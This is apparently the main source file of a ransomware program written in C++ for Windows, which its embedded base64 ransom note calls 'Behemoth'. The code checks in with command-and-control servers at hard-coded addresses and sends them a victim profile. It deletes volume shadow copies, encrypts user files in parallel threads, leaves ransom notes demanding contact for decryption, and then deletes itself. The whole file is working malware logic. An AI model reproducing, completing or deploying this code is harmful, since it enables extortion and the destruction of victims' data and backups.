#include <iostream>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <vector>
#include <mutex>
#include <algorithm>

#include "Core/disk_id.h"
#include "Core/file_search.h"
#include "Core/file_enc.h"
#include "Communication/sendrequest.h"
#include "Communication/google_conn.h"
#include "Communication/c2_conn.h"
#include "Helpers/convert_to_wstring.h"
#include "Helpers/save_results.h"
#include "Helpers/gen_str.h"
#include "Helpers/kill_procs.h"
#include "Helpers/del_shadows.h"
#include "Helpers/json.hpp"
#include "Helpers/create_readmes.h"
#include "Helpers/self_dest.h"
#include "Helpers/desktop_path.h"
#include "Helpers/profiler.h"
#include "Helpers/line_count.hpp"
#include "Helpers/base64decode.hpp"
#include "Helpers/wstringToString.hpp"


std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEArmP8h2N1E11LUj0tYMbGfdP2DwQQyzMO7o3CF3eTSzT2x7RaKqLd1pPYcayeccZL6hvb9duY7KqkLbaRBxxVXEvaQN42fsXevqSBPjIEImGjTprKnNnOHSejNF85LvhnOZxGttJSMLI/X3s0FS/4ia3k4tkYMSs9Jm1exu37waJWq5yUFWeWnuwPgqd7iSG90ebkD5Q/V2UUq8yVj7GcP0T3kjNfn6YCK78uWDasi1uyPf+b4J8Fp8t84GhLZZJXRRnROsCIAEvtIEaPzzkGTs4YQkzPjfRHulbuwTSWAM5asJ+98K3u4yBPsSLe2n/8HFke2MVXsuiSFGpsMhnRyDj45z3P0eEEdBDBCP+M4dVDJ1p1DxhycrI02uwM7jBubTAOYfXmrA7tWkg7Iz/WOx1edJJDL9Y8T58/Fr5mvCxGbr3dB1yskE1aXs1+9yNVeJ2hOo92/YTKZDq/GCCyHvWJlJ4lPNHNgtVObeQtRR6GAFr6QRkv55SWqkuJzT7pAgMBAAE=";
std::string README = "WW91ciBmaWxlcyBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBCZWhlbW90aCByYW5zb213YXJlLgoKVGhlIGZpbGUgaGFzaCBmb3IgdGhpcyBleGVjdXRhYmxlIGlzIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgKCkNvbnN0YW50IHVzIGF0IGNvbnN0YW50QGMwbnN0YW50LmNhIHdpdGggdGhlIGV4ZWN1dGFibGUncyBoYXNoIHRvIGRlY3J5cHQgeW91ciBmaWxlcy4KCg==";

bool ONLINE_ENC = true;
std::wstring C2_URL = L""; 
std::vector<std::wstring> URLS = {
        L"http://10.0.0.140/",
        L"https://10.0.0.113:5000/",
        L"http://10.0.0.10:6532/"
};


int encryption(bool status);



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (ONLINE_ENC) {
        // check connection with google
        if (googleConn()) {
            // if connection google succeeded, check connection with C2 URLs and retrieve a valid c2 URL
            C2_URL = c2_conn(URLS) + L"new-user";
            // if no live C2 is found, begin offline encryption:
            if (C2_URL.empty()) {
                encryption(false);
            }
            // otherwise, begin online encryption
            else{
                encryption(true);
            }
        }
    }

    if (!ONLINE_ENC) {
        // if offline encryption: begin offline encryption & use hard-coded key and readme
        encryption(false);
    }

    self_destruct();

    return 0;
}


int encryption(bool status) {
    // Identify all drives
    std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
    // Store all logical drives to an array
    std::vector<std::wstring> logicalDrives = drives["logical"];


    // Generate a unique wstring:
    std::string randomTempStr = gen_str(8);
    std::wstring randomWStr(randomTempStr.begin(), randomTempStr.end());


    // Path to temp directory
    WCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    std::wstring wstrTempPath(tempPath);
    // Path to a text file for storing file paths
    std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";


    // Search for files in each drive & ignore forbidden folders 
    std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
    std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users",
                                                        L"PerfLogs", L"Recovery", L"Path", L"Program Files (x86)", L"$Recycle.Bin" };

    for (const auto& drive : logicalDrives) {
        std::vector<std::wstring> files = FileSearcher(drive, fileTypes, forbiddenDirs);
        SaveResultsToFile(filePath, files);
    }

    // kill all processes and nuke VSS (killing processes might cause errors)
    // KillProcs();
    nuke_vss();


    // if encryption is online, send profile & get instructions and public key from c2 
    if (status) {
        // set value for total number of writable files
        std::string filesCount = countNonEmptyLines(filePath);
        // send profile to c2
        nlohmann::json profileJson = profiler(filesCount);
        std::cout << profileJson.dump(4) << std::endl;
        std::string response = sendrequest(C2_URL, profileJson);

        // read json response and write it to global variables:
        auto jsonResponse = nlohmann::json::parse(response);

        // Check for presence of "message" key and its value
        if (jsonResponse.contains("message") && jsonResponse["message"] == "success") {
            // Update global variables if respective keys exist
            if (jsonResponse.contains("data")) {
                README = jsonResponse["data"];
            }
            if (jsonResponse.contains("public_key")) {
                PUBLIC_KEY = jsonResponse["public_key"];
            }
        }
    }
    
    

    // read file paths from filePath and save them to a list
    std::vector<std::wstring> filesToProcess;
    std::wifstream inFile(filePath);
    std::wstring line;
    while (std::getline(inFile, line)) {
        filesToProcess.push_back(line);
    }
    inFile.close();


    // Use 32 threads for parallel processing
    const int maxThreads = std::min<int>(32, static_cast<int>(std::thread::hardware_concurrency()));
    std::vector<std::map<std::string, std::map<std::string, std::string>>> results(maxThreads);
    std::mutex resultMutex;


    // Use parallelism to process multiple files simultaneously
    auto processFiles = [&](int tid, int start, int end) {
        for (int i = start; i < end; ++i) {
            // 3. Encrypt the file.
            int requiredSize = WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, NULL, 0, NULL, NULL);
            std::string narrowFilePath(requiredSize, 0);
            WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, &narrowFilePath[0], requiredSize, NULL, NULL);
            narrowFilePath.pop_back(); // Remove the null-terminator

            auto encResult = AESEncrypt(narrowFilePath, PUBLIC_KEY);
            for (const auto& [key, value] : encResult) {
                results[tid][key] = value;
            }
        }
    };


    std::vector<std::thread> threads;
    int blockSize = filesToProcess.size() / maxThreads;
    for (int t = 0; t < maxThreads; ++t) {
        int start = t * blockSize;
        int end = (t == maxThreads - 1) ? filesToProcess.size() : start + blockSize;
        threads.push_back(std::thread(processFiles, t, start, end));
    }

    for (auto& t : threads) {
        t.join();
    }


    // Merge results or dictionaries into one
    std::map<std::string, std::map<std::string, std::string>> combinedResult;
    for (const auto& res : results) {
        for (const auto& [key, value] : res) {
            combinedResult[key] = value;
        }
    }


    // Convert combined dictionary to JSON and save them to a random file in Desktop
    nlohmann::json j = combinedResult;
    std::filesystem::path desktopPath = getDesktopPath();
    std::string randomStr = gen_str(8);
    std::wstring jsonFileName = L"FILES_" + std::wstring(randomStr.begin(), randomStr.end()) + L".json";
    std::filesystem::path finalJsonPath = desktopPath / jsonFileName;

    std::ofstream jsonFile(finalJsonPath);
    jsonFile << j.dump(4);
    jsonFile.close();


    // save readme to multiple locations
    std::string randomReadme = gen_str(8);
    std::string readmeFileName = "README_" + randomReadme + ".txt";
    create_readmes(DecodeBase64(README), readmeFileName);
    

    return 0;
}

